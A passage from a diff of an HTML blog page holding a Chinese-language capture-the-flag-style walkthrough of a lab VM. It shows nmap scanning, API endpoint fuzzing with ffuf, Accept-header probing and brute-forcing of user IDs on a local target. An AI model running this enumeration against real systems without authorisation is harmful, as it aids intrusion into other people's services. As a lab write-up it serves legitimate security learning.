@@ -104,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Preference.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/217751621">
 <title>内部_Preference</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -128,7 +128,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -162,23 +172,22 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h2>Nmap</h2>
 <p>先扫同网段存活主机：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
 192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
 192.168.205.217 08:00:27:41:6d:e2       PCS Systemtechnik GmbH
-192.168.205.254 00:50:56:ee:3d:16       VMware, Inc.
-</code></pre>
+192.168.205.254 00:50:56:ee:3d:16       VMware, Inc.</pre></div>
 <p>目标是：</p>
-<pre lang="text"><code>192.168.205.217
+<pre lang="text" class="notranslate"><code class="notranslate">192.168.205.217
 </code></pre>
 <p>全端口扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.217
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 04:38 -0400
-Nmap scan report for 192.168.205.217
+Nmap scan report <span class="pl-k">for</span> 192.168.205.217
 Host is up (0.00089s latency).
 Not shown: 65534 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -186,55 +195,51 @@ PORT     STATE SERVICE
 5566/tcp open  westec-connect
 MAC Address: 08:00:27:41:6D:E2 (Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 5.50 seconds</pre></div>
 <p>开放端口很少：</p>
-<pre lang="text"><code>22/tcp   ssh
+<pre lang="text" class="notranslate"><code class="notranslate">22/tcp   ssh
 5566/tcp api
 </code></pre>
 <p>优先看 5566。</p>
-<hr />
+<hr>
 <h2>API</h2>
 <p>访问根路径：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl 192.168.205.217:5566
-{&quot;hint&quot;:&quot;Some endpoints respond differently based on what you ask for.&quot;,&quot;service&quot;:&quot;Maze Corp Internal API Gateway&quot;,&quot;version&quot;:&quot;2.1.0&quot;}
-</code></pre>
+{<span class="pl-s"><span class="pl-pds">"</span>hint<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Some endpoints respond differently based on what you ask for.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>service<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Maze Corp Internal API Gateway<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>version<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>2.1.0<span class="pl-pds">"</span></span>}</pre></div>
 <p>提示语：</p>
-<pre lang="text"><code>Some endpoints respond differently based on what you ask for.
+<pre lang="text" class="notranslate"><code class="notranslate">Some endpoints respond differently based on what you ask for.
 </code></pre>
 <p>这句话已经在暗示：</p>
-<pre lang="text"><code>某些端点会根据请求头里“你想要什么格式”返回不同结果
+<pre lang="text" class="notranslate"><code class="notranslate">某些端点会根据请求头里“你想要什么格式”返回不同结果
 </code></pre>
 <p>先看根路径支持哪些方法：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl 192.168.205.217:5566 -X OPTIONS -i
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 08:39:25 GMT
-Content-Type: text/html; charset=utf-8
+Content-Type: text/html<span class="pl-k">;</span> charset=utf-8
 Allow: OPTIONS, GET, HEAD
 Content-Length: 0
-Connection: close
-</code></pre>
+Connection: close</pre></div>
 <p>根路径只支持：</p>
-<pre lang="text"><code>GET / HEAD / OPTIONS
+<pre lang="text" class="notranslate"><code class="notranslate">GET / HEAD / OPTIONS
 </code></pre>
 <p>POST 不允许：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl 192.168.205.217:5566 -X POST
-&lt;!doctype html&gt;
-&lt;html lang=en&gt;
-&lt;title&gt;405 Method Not Allowed&lt;/title&gt;
-&lt;h1&gt;Method Not Allowed&lt;/h1&gt;
-&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;
-</code></pre>
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>doctype html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html lang=en<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>405 Method Not Allowed<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Method Not Allowed<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+<span class="pl-k">&lt;</span>p<span class="pl-k">&gt;</span>The method is not allowed <span class="pl-k">for</span> the requested URL.<span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span></pre></div>
 <p>根路径没有太多信息，开始枚举端点。</p>
-<hr />
+<hr>
 <h2>API 爆破</h2>
 <p>先手工试常见路径，没有结果：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ for p in api status health data users user fetch export import config admin debug info version render report convert parse; do printf &quot;%-10s &quot; &quot;$p&quot;; curl -s -o /dev/null -w &quot;%{http_code}\n&quot; 192.168.205.217:5566/$p; done
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">for</span> <span class="pl-smi">p</span> <span class="pl-k">in</span> api status health data users user fetch <span class="pl-k">export</span> import config admin debug info version render report convert parse<span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>%-10s <span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$p</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> curl -s -o /dev/null -w <span class="pl-s"><span class="pl-pds">"</span>%{http_code}\n<span class="pl-pds">"</span></span> 192.168.205.217:5566/<span class="pl-smi">$p</span><span class="pl-k">;</span> <span class="pl-k">done</span>
 api        404
 status     404
 health     404
@@ -242,7 +247,7 @@ data       404
 users      404
 user       404
 fetch      404
-export     404
+<span class="pl-k">export</span>     404
 import     404
 config     404
 admin      404
@@ -252,44 +257,42 @@ version    404
 render     404
 report     404
 convert    404
-parse      404
-</code></pre>
-<p>改为 <code>ffuf</code> 跑 <code>/api/</code>：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+parse      404</pre></div>
+<p>改为 <code class="notranslate">ffuf</code> 跑 <code class="notranslate">/api/</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ffuf -u http://192.168.205.217:5566/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404 -t 80
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://192.168.205.217:5566/api/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 80
- :: Matcher          : Response status: all
- :: Filter           : Response status: 404
-________________________________________________
-
-user                    [Status: 400, Size: 97, Words: 5, Lines: 2, Duration: 159ms]
-health                  [Status: 200, Size: 33, Words: 1, Lines: 2, Duration: 305ms]
-</code></pre>
+        /<span class="pl-s"><span class="pl-pds">'</span>___\  /<span class="pl-pds">'</span></span>___<span class="pl-cce">\ </span>          /<span class="pl-s"><span class="pl-pds">'</span>___\</span>
+<span class="pl-s">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
+<span class="pl-s">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span>
+<span class="pl-s">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span>
+<span class="pl-s">         \ \_\   \ \_\  \ \____/  \ \_\</span>
+<span class="pl-s">          \/_/    \/_/   \/___/    \/_/</span>
+<span class="pl-s"></span>
+<span class="pl-s">       v2.1.0-dev</span>
+<span class="pl-s">________________________________________________</span>
+<span class="pl-s"></span>
+<span class="pl-s"> :: Method           : GET</span>
+<span class="pl-s"> :: URL              : http://192.168.205.217:5566/api/FUZZ</span>
+<span class="pl-s"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt</span>
+<span class="pl-s"> :: Follow redirects : false</span>
+<span class="pl-s"> :: Calibration      : false</span>
+<span class="pl-s"> :: Timeout          : 10</span>
+<span class="pl-s"> :: Threads          : 80</span>
+<span class="pl-s"> :: Matcher          : Response status: all</span>
+<span class="pl-s"> :: Filter           : Response status: 404</span>
+<span class="pl-s">________________________________________________</span>
+<span class="pl-s"></span>
+<span class="pl-s">user                    [Status: 400, Size: 97, Words: 5, Lines: 2, Duration: 159ms]</span>
+<span class="pl-s">health                  [Status: 200, Size: 33, Words: 1, Lines: 2, Duration: 305ms]</span></pre></div>
 <p>发现两个有效端点：</p>
-<pre lang="text"><code>/api/health
+<pre lang="text" class="notranslate"><code class="notranslate">/api/health
 /api/user
 </code></pre>
-<hr />
+<hr>
 <h2>端点分析</h2>
-<p>先看 <code>/api/health</code>：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>先看 <code class="notranslate">/api/health</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl -si 192.168.205.217:5566/api/health
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
@@ -298,36 +301,33 @@ Content-Type: application/json
 Content-Length: 33
 Connection: close
 
-{&quot;status&quot;:&quot;ok&quot;,&quot;users_total&quot;:25}
-</code></pre>
+{<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>ok<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>users_total<span class="pl-pds">"</span></span>:25}</pre></div>
 <p>这里给出一个关键数字：</p>
-<pre lang="text"><code>users_total = 25
+<pre lang="text" class="notranslate"><code class="notranslate">users_total = 25
 </code></pre>
 <p>说明数据库里一共有 25 个用户。</p>
-<p>再看 <code>/api/user</code>：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl -s 192.168.205.217:5566/api/user; echo
-{&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:&quot;Missing path variable 'uid'.&quot;,&quot;path&quot;:&quot;/api/user&quot;,&quot;status&quot;:400}
-</code></pre>
+<p>再看 <code class="notranslate">/api/user</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -s 192.168.205.217:5566/api/user<span class="pl-k">;</span> <span class="pl-c1">echo</span>
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Bad Request<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Missing path variable 'uid'.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:400}</pre></div>
 <p>提示非常明显：</p>
-<pre lang="text"><code>Missing path variable 'uid'
+<pre lang="text" class="notranslate"><code class="notranslate">Missing path variable 'uid'
 </code></pre>
 <p>说明它要的是路径变量而不是 query 参数，也就是：</p>
-<pre lang="text"><code>/api/user/&lt;uid&gt;
+<pre lang="text" class="notranslate"><code class="notranslate">/api/user/&lt;uid&gt;
 </code></pre>
 <p>如果给非整数：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl -s &quot;192.168.205.217:5566/api/user/abc&quot;; echo
-&lt;!doctype html&gt;
-&lt;html lang=en&gt;
-&lt;title&gt;404 Not Found&lt;/title&gt;
-&lt;h1&gt;Not Found&lt;/h1&gt;
-&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -s <span class="pl-s"><span class="pl-pds">"</span>192.168.205.217:5566/api/user/abc<span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span>
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>doctype html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html lang=en<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>404 Not Found<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Not Found<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+<span class="pl-k">&lt;</span>p<span class="pl-k">&gt;</span>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.<span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span></pre></div>
 <p>这说明它是整型路由。</p>
-<p>到这里还不能直接判断敏感分支，只知道它会“根据你 ask for 的内容”返回不同东西，所以先把常见的 <code>Accept</code> 类型都试一遍。这里先对一个不存在的 uid 看响应特征：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ for ct in application/json application/xml text/xml application/yaml text/yaml application/x-yaml application/* '*/*'; do echo &quot;== Accept: $ct ==&quot;; curl -si 192.168.205.217:5566/api/user/1 -H &quot;Accept: $ct&quot;; echo; done
+<p>到这里还不能直接判断敏感分支，只知道它会“根据你 ask for 的内容”返回不同东西，所以先把常见的 <code class="notranslate">Accept</code> 类型都试一遍。这里先对一个不存在的 uid 看响应特征：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">for</span> <span class="pl-smi">ct</span> <span class="pl-k">in</span> application/json application/xml text/xml application/yaml text/yaml application/x-yaml application/<span class="pl-k">*</span> <span class="pl-s"><span class="pl-pds">'</span>*/*<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>== Accept: <span class="pl-smi">$ct</span> ==<span class="pl-pds">"</span></span><span class="pl-k">;</span> curl -si 192.168.205.217:5566/api/user/1 -H <span class="pl-s"><span class="pl-pds">"</span>Accept: <span class="pl-smi">$ct</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span><span class="pl-k">;</span> <span class="pl-k">done</span>
 == Accept: application/json ==
 HTTP/1.1 404 NOT FOUND
 Server: Werkzeug/3.1.8 Python/3.14.3
@@ -336,7 +336,7 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
 == Accept: application/xml ==
 HTTP/1.1 404 NOT FOUND
@@ -346,7 +346,7 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
 == Accept: text/xml ==
 HTTP/1.1 404 NOT FOUND
@@ -356,7 +356,7 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
 == Accept: application/yaml ==
 HTTP/1.1 404 NOT FOUND
@@ -366,7 +366,7 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
 == Accept: text/yaml ==
 HTTP/1.1 404 NOT FOUND
@@ -376,7 +376,7 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
 == Accept: application/x-yaml ==
 HTTP/1.1 404 NOT FOUND
@@ -386,9 +386,9 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
-== Accept: application/* ==
+== Accept: application/<span class="pl-k">*</span> ==
 HTTP/1.1 404 NOT FOUND
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 08:51:19 GMT
@@ -396,9 +396,9 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}
 
-== Accept: */* ==
+== Accept: <span class="pl-k">*</span>/<span class="pl-k">*</span> ==
 HTTP/1.1 404 NOT FOUND
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 08:51:19 GMT
@@ -406,64 +406,62 @@ Content-Type: application/json
 Content-Length: 97
 Connection: close
 
-{&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;User with uid '1' not found.&quot;,&quot;path&quot;:&quot;/api/user/1&quot;,&quot;status&quot;:404}
-</code></pre>
+{<span class="pl-s"><span class="pl-pds">"</span>error<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Not Found<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>User with uid '1' not found.<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/api/user/1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:404}</pre></div>
 <p>对不存在的用户没有明显区别，因此还是要先找到真实存在的 uid，再测格式差异。</p>
-<hr />
+<hr>
 <h2>爆破有效 uid</h2>
-<p>这里直接用 <code>ffuf</code> 对 <code>0-10000</code> 跑整数枚举，筛出所有返回 <code>200</code> 的用户：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ ffuf -u http://192.168.205.217:5566/api/user/FUZZ -w &lt;(seq 0 10000) -mc 200 -t 100
+<p>这里直接用 <code class="notranslate">ffuf</code> 对 <code class="notranslate">0-10000</code> 跑整数枚举，筛出所有返回 <code class="notranslate">200</code> 的用户：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ffuf -u http://192.168.205.217:5566/api/user/FUZZ -w <span class="pl-s"><span class="pl-pds">&lt;(</span>seq 0 10000<span class="pl-pds">)</span></span> -mc 200 -t 100
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://192.168.205.217:5566/api/user/FUZZ
- :: Wordlist         : FUZZ: /proc/self/fd/11
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Response status: 200
-________________________________________________
-
-1222                    [Status: 200, Size: 284, Words: 20, Lines: 12, Duration: 236ms]
-1226                    [Status: 200, Size: 288, Words: 20, Lines: 12, Duration: 233ms]
-1335                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 219ms]
-1595                    [Status: 200, Size: 292, Words: 20, Lines: 12, Duration: 219ms]
-1818                    [Status: 200, Size: 280, Words: 20, Lines: 12, Duration: 211ms]
-1954                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 195ms]
-3931                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 201ms]
-4257                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 205ms]
-4526                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]
-4741                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 199ms]
-4828                    [Status: 200, Size: 281, Words: 20, Lines: 12, Duration: 202ms]
-5119                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 204ms]
-5219                    [Status: 200, Size: 288, Words: 20, Lines: 12, Duration: 206ms]
-6530                    [Status: 200, Size: 289, Words: 20, Lines: 12, Duration: 205ms]
-6694                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 204ms]
-7009                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]
-7465                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]
-7920                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 202ms]
-8024                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 205ms]
-8038                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 204ms]
-8764                    [Status: 200, Size: 285, Words: 20, Lines: 12, Duration: 202ms]
-9050                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 204ms]
-9182                    [Status: 200, Size: 285, Words: 20, Lines: 12, Duration: 207ms]
-9409                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 203ms]
-9944                    [Status: 200, Size: 284, Words: 20, Lines: 12, Duration: 201ms]
-</code></pre>
+        /<span class="pl-s"><span class="pl-pds">'</span>___\  /<span class="pl-pds">'</span></span>___<span class="pl-cce">\ </span>          /<span class="pl-s"><span class="pl-pds">'</span>___\</span>
+<span class="pl-s">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
+<span class="pl-s">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span>
+<span class="pl-s">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span>
+<span class="pl-s">         \ \_\   \ \_\  \ \____/  \ \_\</span>
+<span class="pl-s">          \/_/    \/_/   \/___/    \/_/</span>
+<span class="pl-s"></span>
+<span class="pl-s">       v2.1.0-dev</span>
+<span class="pl-s">________________________________________________</span>
+<span class="pl-s"></span>
+<span class="pl-s"> :: Method           : GET</span>
+<span class="pl-s"> :: URL              : http://192.168.205.217:5566/api/user/FUZZ</span>
